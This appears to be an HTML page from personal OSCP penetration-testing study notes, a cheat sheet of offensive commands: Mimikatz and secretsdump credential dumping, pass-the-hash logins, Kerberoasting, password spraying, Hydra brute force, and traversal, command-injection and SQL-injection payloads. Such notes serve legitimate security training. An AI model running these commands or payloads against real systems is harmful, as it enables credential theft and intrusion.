@@ -1,0 +1,395 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <title>Web Fuzzing - AD Notes</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+
+<body>
+
+    <!-- NAVBAR -->
+    <nav>
+        <a href="index.html">Home</a>
+
+        <div class="dropdown">
+            <a href="#">AD ▾</a>
+            <div class="dropdown-content">
+                <a href="enumeration.html">Enumeration</a>
+                <a href="attacking.html">Attacking</a>
+                <a href="lateralMovement.html">Lateral Movement</a>
+                <a href="metodologie.html">Methodology</a>
+            </div>
+        </div>
+        <div class="dropdown">
+            <a href="#">Privesc ▾</a>
+            <div class="dropdown-content">
+                <a href="windows_privesc.html">Windows PrivEsc</a>
+                <a href="linux-privesc.html">Linux Privesc</a>
+            </div>
+        </div>
+        <div class="dropdown">
+            <a href="#">Web ▾</a>
+
+            <div class="dropdown-content">
+
+                <div class="dropdown-sub">
+                    <a href="#">Finger Printing ▾</a>
+
+                    <div class="dropdown-subcontent">
+                        <a href="web/directoryBruteForce.html">Directory Brute Force</a>
+                    </div>
+                </div>
+
+                 <div class="dropdown-sub">
+                    <a href="#">Attacks ▾</a>
+
+                    <div class="dropdown-subcontent">
+                        <a href="web/directoryTraversal.html">Directory Travresal</a>
+                        <a href="web/fileInclusions.html">File Inclusions</a>
+                        <a href="web/fileUpload.html">File Uploads</a>
+                        <a href="web/osCommand.html">OS Command Injections</a>
+                        <a href="web/sqli.html">SQL Injections</a>
+                    </div>
+                </div>
+
+            </div>
+        </div>
+        <div class="dropdown">
+            <a href="#">Passwords Attacks ▾</a>
+
+            <div class="dropdown-content">
+
+                <div class="dropdown-sub">
+                    <a href="#">Network Service login ▾</a>
+
+                    <div class="dropdown-subcontent">
+                        <a href="sshBF.html">SSH </a>
+                        <a href="rdpBF.html">RDP </a>
+                        <a href="httpPostBF.html">HTTP POST Login </a>
+                    </div>
+                </div>
+
+                 <div class="dropdown-sub">
+                    <a href="#">Password cracking ▾</a>
+
+                    <div class="dropdown-subcontent">
+                        <a href="CrakingIntro.html">Craking Intro</a>
+                        <a href="MutatingWordlist.html">Mutating Wordlist</a>
+                        <a href="CrakingMethodology.html">Craking Methodology</a>
+                        <a href="PasswordManager.html">Password Manager</a>
+                        <a href="sshPKP.html">SSH Private Key Passphrase</a>
+                    </div>
+                </div>
+
+                <div class="dropdown-sub">
+                    <a href="#">Password Hashes ▾</a>
+
+                    <div class="dropdown-subcontent">
+                        <a href="ntlmCrack.html">Cracking NTLM</a>
+                        <a href="ntlmPass.html">Passing NTLM</a>
+                        <a href="ntlm2Crack.html">Cracking Net-NTLMv2</a>
+                        <a href="ntlm2Relay.html">Relaying Net-NTLMv2</a>
+                        <a href="WindowsCredsGuard.html">Windows Credential Guard</a>
+                    </div>
+                </div>
+
+            </div>
+        </div>
+        <a href="file-transfer.html">File Transfer</a>
+        <a href="checklist.html">Checklist</a>
+        <a href="pivoting.html">Pivoting</a>
+        <a href="tips.html">Tips</a>
+    </nav>
+     <div class="search-bar">
+        <input type="text" id="global-search" placeholder="Buscar..." />
+        <button onclick="performSearch()">🔍 Search</button>
+        <button id="toggle-results" onclick="toggleSearchResults()">▲</button>
+        <div id="search-results" class="search-results collapsed"></div>
+    </div>
+    <!-- CONTENT -->
+ 
+    <div class="container">
+
+    <h1>OSCP Full Tooling Cheatsheet</h1>
+
+    <!-- SMB / ENUM -->
+    <div class="section">
+        <div class="section-header">SMB Enumeration</div>
+        <div class="section-content">
+
+            <p><strong>smbclient:</strong></p>
+<pre><code>smbclient -L //target_ip -N
+smbclient //target_ip/share -N
+get file
+put file</code></pre>
+
+            <p><strong>smbmap:</strong></p>
+<pre><code>smbmap -H target_ip
+smbmap -H target_ip -u user -p password -r</code></pre>
+
+            <p><strong>enum4linux:</strong></p>
+<pre><code>enum4linux -a target_ip</code></pre>
+
+        </div>
+    </div>
+
+    <!-- CRACKMAP / NETEXEC -->
+    <div class="section">
+        <div class="section-header">CrackMapExec / NetExec</div>
+        <div class="section-content">
+
+<pre><code>crackmapexec smb target_ip
+crackmapexec smb target_ip -u user -p password
+crackmapexec smb target_ip -u users.txt -p password
+crackmapexec smb target_ip -u user -p password --shares
+crackmapexec smb target_ip -u user -p password -x "whoami"</code></pre>
+
+        </div>
+    </div>
+
+    <!-- IMpacket -->
+    <div class="section">
+        <div class="section-header">Impacket Suite</div>
+        <div class="section-content">
+
+<pre><code>impacket-psexec user:password@target_ip
+impacket-wmiexec user:password@target_ip
+impacket-smbexec user:password@target_ip
+
+impacket-psexec -hashes LM:NT user@target_ip
+impacket-secretsdump user:password@target_ip
+
+impacket-GetNPUsers domain/ -usersfile users.txt -no-pass
+impacket-GetUserSPNs domain/user:password -request</code></pre>
+
+        </div>
+    </div>
+
+    <!-- AD ENUM -->
+    <div class="section">
+        <div class="section-header">Active Directory Tools</div>
+        <div class="section-content">
+
+            <p><strong>PowerView:</strong></p>
+<pre><code>Get-NetUser
+Get-NetGroup
+Get-NetComputer
+Invoke-ShareFinder</code></pre>
+
+            <p><strong>BloodHound:</strong></p>
+<pre><code>bloodhound-python -d domain.local -u user -p password -dc target_ip -c all
+SharpHound.exe -c All</code></pre>
+
+            <p><strong>ldapsearch:</strong></p>
+<pre><code>ldapsearch -x -h target_ip -b "dc=domain,dc=local"</code></pre>
+
+            <p><strong>kerbrute:</strong></p>
+<pre><code>kerbrute userenum -d domain.local users.txt
+kerbrute passwordspray -d domain.local users.txt password</code></pre>
+
+        </div>
+    </div>
+
+    <!-- MIMIKATZ -->
+    <div class="section">
+        <div class="section-header">Mimikatz</div>
+        <div class="section-content">
+
+<pre><code>privilege::debug
+sekurlsa::logonpasswords
+lsadump::sam
+lsadump::secrets</code></pre>
+
+        </div>
+    </div>
+
+    <!-- EVIL-WINRM -->
+    <div class="section">
+        <div class="section-header">Evil-WinRM</div>
+        <div class="section-content">
+
+<pre><code>evil-winrm -i target_ip -u user -p password
+evil-winrm -i target_ip -u user -H NTLM_HASH</code></pre>
+
+        </div>
+    </div>
+
+    <!-- WEB FUZZING -->
+    <div class="section">
+        <div class="section-header">Web Fuzzing Tools</div>
+        <div class="section-content">
+
+            <p><strong>gobuster:</strong></p>
+<pre><code>gobuster dir -u http://target -w wordlist.txt</code></pre>
+
+            <p><strong>ffuf:</strong></p>
+<pre><code>ffuf -u http://target/FUZZ -w wordlist.txt</code></pre>
+
+            <p><strong>feroxbuster:</strong></p>
+<pre><code>feroxbuster -u http://target -w wordlist.txt</code></pre>
+
+            <p><strong>wfuzz:</strong></p>
+<pre><code>wfuzz -c -z file,wordlist.txt http://target/FUZZ</code></pre>
+
+        </div>
+    </div>
+
+    <!-- WEB ATTACKS -->
+    <div class="section">
+        <div class="section-header">Web Exploitation</div>
+        <div class="section-content">
+
+            <p><strong>Directory Traversal:</strong></p>
+<pre><code>../../../../etc/passwd
+..%2f..%2f..%2fetc/passwd</code></pre>
+
+            <p><strong>Command Injection:</strong></p>
+<pre><code>; whoami
+&& whoami
+| whoami</code></pre>
+
+            <p><strong>SQL Injection:</strong></p>
+<pre><code>' OR 1=1--
+' UNION SELECT NULL,NULL--
+' AND SLEEP(5)--</code></pre>
+
+        </div>
+    </div>
+
+    <!-- HYDRA -->
+    <div class="section">
+        <div class="section-header">Hydra (Bruteforce)</div>
+        <div class="section-content">
+
+<pre><code>hydra -l user -P passwords.txt ssh://target_ip
+hydra -l user -P passwords.txt ftp://target_ip
+hydra -L users.txt -p password rdp://target_ip</code></pre>
+
+<pre><code>hydra -L users.txt -P passwords.txt target_ip http-post-form "/login:user=^USER^&pass=^PASS^:Invalid"</code></pre>
+
+        </div>
+    </div>
+
+    <!-- JOHN / HASHCAT -->
+    <div class="section">
+        <div class="section-header">John & Hashcat</div>
+        <div class="section-content">
+
+            <p><strong>John:</strong></p>
+<pre><code>john hash.txt --wordlist=rockyou.txt
+john --show hash.txt</code></pre>
+
+<pre><code>zip2john file.zip > hash.txt
+ssh2john id_rsa > hash.txt
+keepass2john db.kdbx > hash.txt
+pdf2john file.pdf > hash.txt</code></pre>
+
+            <p><strong>Hashcat:</strong></p>
+<pre><code>hashcat -m 1000 hash.txt rockyou.txt</code></pre>
+
+        </div>
+    </div>
+
+    <!-- SMB TOOLS -->
+    <div class="section">
+        <div class="section-header">Additional SMB / AD Tools</div>
+        <div class="section-content">
+
+<pre><code>impacket-smbclient target_ip -u user -p password</code></pre>
+
+        </div>
+    </div>
+
+    <!-- WORKFLOW -->
+    <div class="section">
+        <div class="section-header">Practical Workflow (Exam Mental Model)</div>
+        <div class="section-content">
+
+            <ol>
+                <li>Enumerate SMB → smbclient / enum4linux / smbmap</li>
+                <li>Validate creds → crackmapexec</li>
+                <li>Execute commands → impacket / evil-winrm</li>
+                <li>Dump creds → mimikatz / secretsdump</li>
+                <li>AD pivot → bloodhound / powerview</li>
+                <li>Web → fuzz → exploit (ffuf, gobuster)</li>
+                <li>Bruteforce if needed → hydra</li>
+                <li>Crack hashes → john / hashcat</li>
+            </ol>
+
+        </div>
+    </div>
+
+</div>
+
+    <!-- SCRIPT -->
+    <script>
+                document.querySelectorAll(".section-header").forEach(h => {
+                        h.addEventListener("click", () => h.parentElement.classList.toggle("active"))
+                });
+                function toggleSearchResults() {
+                        const results = document.getElementById("search-results");
+                        const toggleBtn = document.getElementById("toggle-results");
+
+                        results.classList.toggle("collapsed");
+
+                        if (results.classList.contains("collapsed")) {
+                                toggleBtn.textContent = "▼";
+                        } else {
+                                toggleBtn.textContent = "▲";
+                        }
+                }
+
+                function performSearch() {
+                        const query = document.getElementById("global-search").value.toLowerCase();
+                        const resultsContainer = document.getElementById("search-results");
+                        resultsContainer.innerHTML = "";
+
+                        if (!query) {
+                                resultsContainer.classList.add("collapsed");
+                                return;
+                        }
+
+                        const allElements = Array.from(document.body.querySelectorAll("*"))
+                                .filter(el => el.children.length === 0 && el.textContent.toLowerCase().includes(query));
+
+                        if (allElements.length === 0) {
+                                resultsContainer.innerHTML = "<div>No se encontraron resultados</div>";
+                        } else {
+                                allElements.forEach((el, idx) => {
+                                        let container = el.closest(".section, .sub-section") || el;
+
+                                        if (!container.id) {
+                                                container.id = `search-target-${idx}`;
+                                        }
+
+                                        const div = document.createElement("div");
+                                        div.textContent = el.textContent;
+                                        div.style.cursor = "pointer";
+                                        div.style.padding = "5px 10px";
+                                        div.style.borderBottom = "1px solid #1e293b";
+                                        div.onmouseover = () => div.style.backgroundColor = "#1e293b";
+                                        div.onmouseout = () => div.style.backgroundColor = "";
+                                        div.onclick = () => {
+                                                if (container.classList.contains("section") || container.classList.contains("sub-section")) {
+                                                        container.classList.add("active");
+                                                }
+
+                                                container.scrollIntoView({ behavior: "smooth", block: "center" });
+
+                                                container.classList.add("highlight-fade");
+                                                setTimeout(() => container.classList.remove("highlight-fade"), 2000);
+                                        };
+
+                                        resultsContainer.appendChild(div);
+                                });
+                        }
+
+                        resultsContainer.classList.remove("collapsed");
+                }
+        </script>
+
+</body>
+
+</html>
